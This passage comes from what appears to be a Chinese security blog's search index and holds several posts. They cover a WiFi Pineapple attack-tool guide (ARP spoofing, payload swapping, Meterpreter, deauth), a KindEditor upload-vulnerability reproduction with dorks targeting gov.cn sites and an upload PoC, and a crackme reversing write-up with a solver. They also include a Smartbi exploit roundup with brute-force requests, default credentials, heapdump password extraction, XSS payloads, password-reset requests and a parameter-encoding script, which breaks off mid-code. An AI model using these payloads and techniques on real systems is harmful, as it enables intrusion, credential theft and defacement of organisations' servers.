可以通过ettercap欺骗，替换目标下载文件，可以改变js利用浏览器漏洞，可以改变文档利用office漏洞，可以改变exe利用各种漏洞 可以使用CursedScreech的payload进行监听和执行命令 也可以使用Meterpreter接收会话 这个总结起来就是，我是你的网关，你的全部网络流量我都做主，我想怎么玩就怎么玩 组合漏洞利用 https://www.youtube.com/watch?v=Bvo43JvmeW0 5.数据采集演示如果使用Pineapple在网络内采集数据，用于展示或进一步分析的话，可以使用一些抓取类模块 tcpdump可以对网络数据进行抓取和过滤，配合其他软件可以进行展示 ngrep功能同上，对网络内数据进行抓取及展示 nmap用于网络内设备发现及扫描 p0f被动网络指纹识别，被动收集网络内系统指纹 get模块抓取客户端浏览器信息 dump1090配合电视棒，可以获取无线电信息，展示如飞机航线等信息 6.恶意破坏如果就是想要搞事情，Pineapple也可以实现一些功能 可以使用ettercap进行ARP欺骗，可以导致断网 Deauth模块可以导致网络内认证失败，无法进行认证连接 参考链接freebuf：https://www.freebuf.com/sectool/196358.html 官方wiki：https://wiki.wifipineapple.com/#!index.md 官方论坛：https://forums.hak5.org/ Modules库：https://github.com/hak5/wifipineapple-modules 中文用户手册：http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf 搭建视频：https://www.youtube.com/watch?v=Nv1eiIwOPKo 模块编写视频：https://www.youtube.com/watch?v=Lvf2At3G1C0 SSLsplit模块：https://www.roe.ch/SSLsplit ettercap模块：https://github.com/Ettercap/ettercap autossh模块：https://blog.csdn.net/fanwenjieok/article/details/53033317 dump1090 模块：http://www.satsignal.eu/raspberry-pi/dump1090.html tcpdump 模块：http://www.tcpdump.org/ ngrep 模块：https://www.trustauth.cn/wiki/10824.html CursedScreech 模块：https://github.com/sud0nick/CursedScreech Reaponder 模块：https://github.com/SpiderLabs/Responder 组合案例演示视频：https://www.youtube.com/watch?v=Bvo43JvmeW0","link":"/2021/01/07/IOT/WIFI%E6%B8%97%E9%80%8F%E5%88%A9%E5%99%A8PineApple-Nano/"},{"title":"kindeditor&lt;&#x3D;4.1.5上传漏洞复现","text":"漏洞描述 漏洞存在于kindeditor编辑器里，你能上传.txt和.html文件，支持php/asp/jsp/asp.net,漏洞存在于小于等于kindeditor4.1.5编辑器中 这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”) 批量搜索1234567891011inurl:/examples/uploadbutton.htmlinurl:/php/upload_json.phpinurl:/asp.net/upload_json.ashxinurl://jsp/upload_json.jspinurl://asp/upload_json.aspinurl:gov.cn/kindeditor/ 漏洞问题根本脚本语言自定义不同的上传地址，上传之前有必要验证文件 upload_json.* 的存在 1234567/asp/upload_json.asp/asp.net/upload_json.ashx/jsp/upload_json.jsp/php/upload_json.php 可目录变量查看是否存在那种脚本上传漏洞: 1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 漏洞利用google搜素一些存在的站点 inurl：kindeditor 1.查看版本信息 http://www.xxx.org/kindeditor//kindeditor.js 2.版本是4.1.10可以进行尝试如下路径是否存在有必要验证文件 upload_json.* 1234567kindeditor/asp/upload_json.asp?dir=filekindeditor/asp.net/upload_json.ashx?dir=filekindeditor/jsp/upload_json.jsp?dir=filekindeditor/php/upload_json.php?dir=file 3.如下图可以看出是存在jsp上传点: http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file 4.写出下面的构造上传poc,这里需要修改...以及url : 的内容,根据实际情况修改. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt;&lt;head&gt;&lt;title&gt;Uploader&lt;/title&gt;&lt;script src=&quot;http://www.xxx.org/kindeditor//kindeditor.js&quot;&gt;&lt;/script&gt;&lt;script&gt;KindEditor.ready(function(K) {var uploadbutton = K.uploadbutton({button : K('#uploadButton')[0],fieldName : 'imgFile',url : 'http://www.xxx.org/kindeditor/jsp/upload_json.jsp?dir=file',afterUpload : function(data) { if (data.error === 0) {var url = K.formatUrl(data.url, 'absolute');K('#url').val(url);}},});uploadbutton.fileBox.change(function(e) {uploadbutton.submit();});});&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;upload&quot;&gt;&lt;input class=&quot;ke-input-text&quot; type=&quot;text&quot; id=&quot;url&quot; value=&quot;&quot; readonly=&quot;readonly&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;uploadButton&quot; value=&quot;Upload&quot; /&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 简化版： 123456789&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://xxx.com/front/js/kindeditor-4.1.10/jsp/upload_json.jsp?dir=file&quot; method=&quot;post&quot;&gt; Upload a new file:&lt;br&gt; &lt;input type=&quot;file&quot; name=&quot;imgFile&quot; size=&quot;50&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt; &lt;/form&gt; Burp抓包查看上传地址并访问 修复意见1.直接删除upload_json.和file_manager_json. 2.升级kindeditor到最新版本 参考链接https://www.cnblogs.com/backlion/p/10421405.html","link":"/2021/01/12/WEB/Exploit/kindeditor-4-1-5%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"crackme-系列之-crackme5","text":"这个和Crackme005和004的作者是同一个，不过增加了更多的防护 查壳 程序是使用Delphi编写的，加了个UPX壳，随随便便就能脱掉。 关于脱壳 这个壳的话，有三种脱的方式，PEiD通用脱壳器 手动脱和专用的脱壳器，这里建议用专用的脱壳器 反汇编代码和对 齐比较准确方便后面的分析，我用脱壳器脱的时候报错了，所以直接从网上找了一个脱好了的。 使用DarkDe分析程序 把脱壳后的程序拖如DarkDe 首先来观察一下窗体，发现这里有一个隐藏的Edit框。 再来观察一下事件按钮，有如下几个响应事件： 表单创建 Timer1定时器 按钮的鼠标按下事件 双击事件 Edit2的双击事件 表单的鼠标移动事件 Image1的鼠标按下事件 Image2的鼠标按下事件 Image3的鼠标按下事件 Image4的鼠标按下事件 Timer2定时器 按钮点击事件 接着再来看一下控件的ID，这个会方便以后的分析，注意了，如果你脱壳用的是手动的方法或者是通用脱壳机，这个 控件ID是显示不出来的。所以能用专用脱壳器脱尽量不要手脱。 分析程序导出符号首先为了方便我们分析，把程序拖到IDA里，添加Delphi的所有的签名，然后导出map文件，加载到OD中，方便后 续的调试。 找到这个注册成功的字符串，跟进去。 拉到函数头的位置，我们看到右边有个IDA的注释，说明这个是Timer2的响应事件。然后这里有连续的五条跳转指 令，都是跳到函数结束的位置。那么要想注册成功，就必须让这五个条件不成立。 分析第一层防护右键-&gt;查找所有常量-&gt;查找0x3C4，找到0xC34被赋值的位置，我们的目的是不让这个地方被赋值。 接着找到函数头的位置，IDA的位置显示这个是表单的创建事件 分析表单创建事件接着，在函数头的位置下断点，分析整个表单创建事件。分析表单创建事件的目的是为了让ebx+0x304这个位置的值 不被赋值为0xC34。整个事件的代码分析如下： 初始化控件 读取文件内容 接着获取 C:\\ajj.126.c0m\\j\\o\\j\\o\\ok.txt 的文件句柄，读取文件，然后检索IO输入操作结果，如果检索失败， 直接退出函数。 如果文件存在，那么从文本中读取字符串，然后比较文本中的字符串是否是作者要求的，这个123456789是我自己写 入txt文件中测试用的，如果要复制作者要求的那个字符串，必须把从0x20开始到00的所有十六进制复制下来。如果 字符串比较通过，那么就会跳过 [ebx+0x304] 被赋值为 0xC34 的过程，至此整个表单创建函数就完成了。 破解第一层防护创建文件，路径为: C:\\ajj.126.c0m\\j\\o\\j\\o\\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。 成功破解第一层防护之后，隐藏的Edit编辑框就出来了。但是这个编辑框是被禁用的。 分析第二层防护计时器的五个条件我们已经满足了第一个，接下来回到计时器的入口，从第二个条件入手。 条件二调试默认已经满足了，跳转不会实现。那么我们现在要满足条件三，让 [ebx+0x310] 赋值为 0xF94 。 同样，搜索 0xF94 这个常量，找到赋值的地方。 直接跟进去，拉到函数头部，发现这里是表单的鼠标移动事件。接下来开始分析这个事件的所有的代码。 分析表单的鼠标移动事件接下来在函数头部下断点，然后从左上角移动到表单，触发断点，分析整个函数。 获取坐标 获取坐标 首先把参数一和参数二给edx和eax，我们必须知道这两个参数是什么。因为这是鼠标点击事件，初步猜测是鼠标的X 和Y坐标。接下来做四次测试 1234左上角：edx=0 eax=0x1C右上角：edx=0 eax=0x101左下角：edx=0x13B eax=0x5 右下角：edx=0x13B eax=0x103 当从不同的位置移入表单，对应的eax和edx的值都不相同，所以判断这两个参数是横纵坐标，而且坐标系的原点在 左上角。 校验图片接着函数取出了一个图片对象，然后判断是否是这个图片对象 可以看到Image3的ID是0x2E0,所以只有当图片为Image3的时候才能满足条件，而Image3根据测试是”性相近” 校验坐标 接着将横坐标和0xE2做比较，将纵坐标和0x12C做比较，小于或等于跳转，那么就是说如果想让他不跳转，横纵坐标 必须大于这两个值。整个表单的原点是左上角，那么我们必须从右下角移入才能满足条件。 再次校验图片和坐标 接着再次校验图片是否是Image2 Image2是性本善，然后校验横坐标和纵坐标，这一次必须从左下角移入才能满足条 件。然后再判断 [ebx+0x30C] 这个地址的值是否是 0x9 ，默认这个值是0x9，所以这里又是一层防护。只有满足了 [ebx+0x30C]这个地址的值是9，才能把ebx+0x310赋值为0xF94，也就是满足我们的第二层防护。 分析第三层防护接下来还是一样，要让[ebx+0x30C]这个地址的值不为9，查找所有常量。符合要求的只有第一条和第二条。 而第一条跟进去发现这是之前分析过的表单创建的时候就被赋值为30C，所以目标不是这里，是第二条。 第二条跟进去，拉到函数头的位置 发现这里是Edit2的双击事件，而Edit2目前是禁用的，所以双击事件根本断不下来，这又是一层防护。 分析第四层防护想要破解第二层防护必须先破解第三层防护，想要破解第三层防护，就必须先破解第四层防护，这是在玩俄罗斯套娃 啊。那么我们这一步必须让Edit2控件变成启用状态。怎么做呢？利用刚才看到的控件ID。 Edit2的控件ID是0x2F0，接着搜索所有常量。 挨个点进去进行查找，经过排查发现真正的开启Edit2 控件的是第四个。 这个函数并不长，是Panel1的双击事件，想要让Edit2控件被启用，就必须让eax+0x308这个地址被赋值为0x29D。 Panel是什么东西呢。打开一下DarkDe，中间的这个大按钮就是Panel1，注意不是图片是按钮。所以想要触发这个 事件必须是双击空白处才能让程序断下。 分析第五层防护0x308 查找常量，第三条，跟进去,这里是注册按钮的鼠标按下事件。 首先比较edx=0x230D，这个是直接能通过的，没有给咱下套，我还以为又套了一层。接着比较cl是1，cl的话必须是 右键单击，还是用猜，鼠标无非就量个参数，坐标和左右按键。eax+0x308的初始值是0x28E，右键单击一次增加 3，所以只要将注册按钮右键单击5次，第五层防护就算过了。 破解第五层防护右键单击五次注册按钮 破解第四层防护第五层防护已经过了，那么接下来来到没有解决的第四层。 鼠标右键单击五次注册按钮，然后等图片过了，双击大按钮，响应事件断下 这个时候可以看到eax+0x308的值已经是29D了 Edit2编辑框也能正常使用了。 破解第三层防护Edit2编辑框的编辑框已经启用了，那么接下来双击编辑框 程序成功断下，接下来分析Edit2的双击事件。我们的目的要让[ebx+0x30C]被赋值为eax，达到破解第二层防护的条件 分析Edit2双击事件 首先获取Edit2的内容，然后获取长度，长度必须等于8，然后比较第二个字符是否是0x5F，0x5F就是下划线。比较第六个字符是否是0x2C，0x2C就是“,” 获取Edit1的内容和长度，然后将长度+3之后除以3 比较余数，余数必须为0。就是说Edit1的长度必须为3的倍数。至此，Ddit2双击事件分析完成。 第一个编辑框长度必须是3的倍数，第二个编辑框第二个字符必须是下划线，第六个字符必须的逗号 破解第二层防护 当破解了第三层防护的时候，第二层防护的比较条件也就满足了。继续往下分析。 接着往下走，程序会获取第一个编辑框的内容然后和ajj做比较，也就是说第一个编辑框必须为ajj。然后会把数字转成 字符串显示到控件。 破解第六层防护接下来来到总验证的地方。也就是一开始的定时器，看看现在的校验情况如何。 我们已经过掉了前三个验证，接下来要过掉第四个，也就是要让ebx+0x318等于ebx+0x314。那么要搞清楚0x318和 0x314这两个位置是怎么被赋值的 分析0x318搜索所有常量-&gt;0x318 除了第一个设置初始值，剩下的所有对这个地址的变量做加法运算。随便点进去第二个，增加二的位置 这里是图片1的鼠标按下的位置，而且显示的是注册不成功。 首先判断鼠标按下的是左键还是右键，如果是左键+2，右键+0x11。 再次回到所有常量的位置，那么规律也就出来了，这几个加法分别对应四张图片，根据点击的按键不同，加的值也不 同。0x318这个位置搞明白了，接下来去分析0x314。 分析0x314搜索所有常量-&gt;0x314。 0x314被赋值的地方也有很多，分别对应五个值。这个几个地址相差的值比较小，说明是同一个函数，随便点进去一 个。 这里是之前分析过的表单的鼠标移动事件，这个地址的值取决于eax的值，有四种情况第一种情况赋值为0x41，第二 种情况赋值为0x3D，第三种情况赋值为0x34，第三种情况赋值为0xDF。然后根据不同的情况，在界面上会显示一个 数字。 而eax的值来自于0x30C这个位置，又得继续往上找。 破解第七层保护接下来还是查找所有常量-&gt;0x30C 来到给0x30C赋值的位置，这里是编辑框的双击事件，之前已经分析过了，但是我没有分析上面两个call具体是做什 么的。 第一个call是获取磁盘的剩余空间，然后将eax做一系列的处理，交给第二个call，第二个call是纯粹的算法了。 最后这两处结合，是根据显示的数字不同，然后对图片采用不同的点击方案。 点击事件的编写根据不同的数字导致的在不同图片时左右点击相加=314即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102void CCM005Dlg::OnOK() { // TODO: Add extra validation here //CDialog::OnOK(); char szKey[1024]={0}; int n = 0; GetDlgItemText(IDC_EDIT1,szKey,1024); if(!strlen(szKey)) { MessageBox(&quot;请按照【前期步骤】获取正确数值后再生成方案！&quot;,&quot;友情提示&quot;); return; } n = GetDlgItemInt(IDC_EDIT1); switch(n){ case 1 : n=0x3D; break; case 2 : n=0x34; break; case 3 : n=0xDF; break; default : // 可选的 n=0x41;} //sprintf(szKey,&quot;%d&quot;,n); //SetDlgItemText(IDC_EDIT2,szKey); struct image { char szname[7]; int nNumber ; int nLef; int nRight; }; image aImage[4]={0}; sprintf(aImage[0].szname,&quot;人之初&quot;); aImage[0].nNumber = 1; aImage[0].nLef = 0x2; aImage[0].nRight = 0x11; sprintf(aImage[1].szname,&quot;性本善&quot;); aImage[1].nNumber = 2; aImage[1].nLef = 0x3; aImage[1].nRight = 0x13; sprintf(aImage[2].szname,&quot;性相近&quot;); aImage[2].nNumber = 3; aImage[2].nLef = 0x5; aImage[2].nRight = 0x17; sprintf(aImage[3].szname,&quot;习相远&quot;); aImage[3].nNumber = 4; aImage[3].nLef = 0x7; aImage[3].nRight = 0x1B;/************************************************************************//* 设计原则，选择出点击次数最少的方案/* iR作为大数数组下标,iL作为小数数组下标,j大数商,k小数商,求i+j最小值 /************************************************************************/ int nRes = 112; int nIL = 0; int nIR = 0; int nJ = 0; int nK =0 ; for (int iL=0;iL&lt;4;iL++) { for (int iR=0;iR &lt; 4;iR++) { for (int j=1;j&lt;=14;j++) { for (int k =0;k&lt;=112;k++) { if ((aImage[iR].nRight*j + aImage[iL].nLef*k == n) &amp;&amp; (nRes&gt; j+k)) { nIL = iL; nIR = iR; nJ = j; nK = k; nRes = j+k ; } } } } } sprintf(szKey,&quot;在“%s”图片时左键点击图片%d次\\r\\n\\r\\n在“%s”图片时右键点击图片%d次\\r\\n\\r\\n即可注册成功!&quot;,aImage[nIL].szname,nK,aImage[nIR].szname,nJ); SetDlgItemText(IDC_EDIT2,szKey);} 校验步骤总结1.创建文件，路径为: C:\\ajj.126.c0m\\j\\o\\j\\o\\ok.txt ，然后将 20 61 6A 6A D0 B4 B5 C4 43 4B 6D 65 D5 E6 C0 C3 21 FF FF 用十六进制编辑器写入到文本。 \\2. 鼠标右键点击五次注册按钮 \\3. 鼠标左键双击图片框的空白处 \\4. 用户名输入ajj \\5. 密码输入1_345,78(第二位必须的下划线，第六位必须的逗号，长度必须8位，其余随便)，然后鼠标左键双击 \\6. 在图片是性相近的时候，鼠标从右下角移入软件框内 \\7. 在图片是性本善的时候，鼠标从左下角移入软件框内 \\8. 根据显示的数字不同，最终的解决方案也不同，具体如下： 数字为0——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 数字为1——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片2次 数字为2——在“性本善”图片时左键点击图片2次，在“性相近”图片时右键点击图片2次 数字为3——在“习相远”图片时左键点击图片1次，在“习相远”图片时右键点击图片8次 数字为4——在“习相远”图片时左键点击图片2次，在“人之初”图片时右键点击图片3次 所有的步骤都执行完毕之后，等待计时器执行完成之后 参考链接https://blog.csdn.net/qq_38474570/article/details/89602599 https://www.52pojie.cn/forum.php?mod=viewthread&amp;page=1&amp;tid=855172","link":"/2021/01/16/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme5/"},{"title":"Smartbi 漏洞总结","text":"SmartBi简介Smartbi是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助分析平台、数据挖掘建模、AI智能分析等大数据分析需求。该软件应用范围较广，据官网介绍，在全球财富500强的10家国内银行，有8家选用了Smartbi。 登录入口https://127.0.0.1/vision/mobileportal.jsp https://127.0.0.1/vision/mobileX/login https://127.0.0.1/vision/index.jsp 密码正确的情况下，部分平台无法登陆，此时设置user-agent为手机端就可以。 SmartBi的两种传参方式RMIServlet加密123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc'(mKi(Kp719J(~K((~K(((pm719JhNp'uKiMM('9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT 直接传输1encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc'(mKi(Kp719J(~K((~K(((pm719JhNp'uKiMM('9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT ecode加密字段解密后为： 1UserService+updateUserForChange+[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 等同于 1className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 构造数据包： 123456789101112131415POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true] 登录暴破1234567891011121314POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/mobileX/logincontent-type: application/x-www-form-urlencodedContent-Length: 70Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=1DA1DAA51469E646F97AD829F29A2B15className=UserService&amp;methodName=login&amp;params=[&quot;admin&quot;,&quot;admin&quot;] 抓取true/false字段 401认证弱口令及敏感目录401弱口令/vision目录下的文件都需要401认证 12345678910admin/adminadmin/manageradmin/2managermining/admindemo/demomanager/demomanager/adminuser/admintest/adminhuanan/admin 实测发现不论用户名输什么，只要密码正确即可 查看版本https://127.0.0.1/vision/version.txt 12021-01-11 15:11:24 https://127.0.0.1/vision/packageinfo.txt 123456Build Time:20200918153547 War Type:dist TAG:Branch_SmartbiV85_6_20190221 Version:8.5.658863.20385 VersionType:Smartbi Insight Edition c0d53d51438945fa5b9839b3e0111e660792d2e1 Spreadsheet fake 目录遍历https://127.0.0.1/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=%2F 信息泄露https://127.0.0.1/vision/monitor/sysprops.jsp https://127.0.0.1/vision/monitor/getclassurl.jsp?classname=smartbi.freequery.expression.ast.TextNode https://127.0.0.1/vision/monitor/hardwareinfo.jsp 接口泄露（直接访问wsdl无需401）https://127.0.0.1/vision/listwsdl.jsp 提供资源目录树的访问功能https://127.0.0.1/vision/services/CatalogService?wsdlSimpleReportService 提供灵活报表相关操作功能 https://127.0.0.1/vision/services/SimpleReportService?wsdlBusinessViewService 提供数据集定义相关操作功能 https://127.0.0.1/vision/services/BusinessViewService?wsdlDataSourceService 提供数据源相关操作功能 https://127.0.0.1/vision/services/DataSourceService?wsdlAnalysisReportService 提供多维分析相关操作功能 https://127.0.0.1/vision/services/AnalysisReportService?wsdlUserManagerService 提供用户相关操作，包括：读取/维护用户信息、读取/维护组信息、读取/维护角色信息、为用户和组分配角色等 https://127.0.0.1/vision/services/UserManagerService?wsdl session劫持+重置用户密码（无需原密码）https://127.0.0.1/vision/monitor/listsessions.jsp [ 理论上重置成功，返回为true，但是实际测试过程中修改后的密码既不是改之前的密码，也不是修改后的密码，过一段时间自动重置为原来的密码。 数据包: 123456789101112131415161718192021222324252627282930POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 148Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=updateUserForChange&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;zhongguo1&quot;,&quot;null&quot;,&quot;QWEqwe123&quot;,true]POST /vision/RMIServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/index.jspIf-Modified-Since: 0Content-Type: application/x-www-form-urlencoded;charset=UTF-8Content-Length: 133Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299className=UserService&amp;methodName=addUserAttribute&amp;params=[&quot;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&quot;,&quot;SYSTEM_user_isEdit&quot;,&quot;0&quot;,null] 其中I8a94ca4e0175ab4aab4aaae90175d3e824c66a87为用户的id字段，唯一身份标识 heapdump缓存抓取密码https://127.0.0.1/vision/monitor/heapdump.jsp https://127.0.0.1/vision/monitor/heapdump.jsp?dumpbin=true 使用Eclipse Memory Analyzer解析内存文件 1select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;)) 反射型/存储型XSS&root=/u01/data/domains/app_domain\">https://127.0.0.1/vision/chooser.jsp?key=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;root=/u01/data/domains/app_domain &pass=123456\">https://127.0.0.1/vision/monitor/testmailserver.jsp?host=mail.longtop.com&amp;user=111%22%3E%3Cimg%20src=x%20onerror=prompt(0)%3E&amp;pass=123456 登录后个人参数位置，加密后传参可导致存储型xss [ SSRF探测出口ip： https://127.0.0.1/vision/monitor/testmailserver.jsp RMIServet加解密12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from urllib.parse import unquotefrom urllib.parse import quoteENCODING_SCHEDULE = { &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;'&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, &quot;%&quot;: &quot;/&quot;, &quot;'&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;, }DECODING_SCHEDULE = { &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;'&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;'&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: 